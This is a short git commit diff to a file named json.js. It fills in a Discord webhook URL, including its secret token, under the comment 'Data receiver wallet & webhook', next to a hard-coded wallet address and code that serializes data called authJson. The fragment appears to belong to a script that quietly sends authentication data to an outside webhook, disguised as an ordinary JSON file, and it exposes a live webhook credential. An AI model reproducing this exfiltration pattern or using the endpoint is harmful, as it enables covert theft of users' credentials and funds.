1d8033e5bba0b8623fc8d3e2b2ab702c00131eda
Hokireceh <108994596+hokireceh@users.noreply.github.com>
2025-04-18 05:49:14 +0700

    Update json.js

--- json.js
+++ json.js
@@ -10,7 +10,7 @@ const raw = [
 
 // Data receiver wallet & webhook
 const RECEIVER = "0x103D1D8d46de2E7829Ad5FBe2D322c705B602780";
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/";
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1360668461940080640/vxoh7Xnw7UyjoywzaNdvTtXh5ortzWlkdnHqBLOzGLDWY5NljNhVPIICtumj8O1JPgbJ";
 
 try {
   const authJson = JSON.stringify(raw);
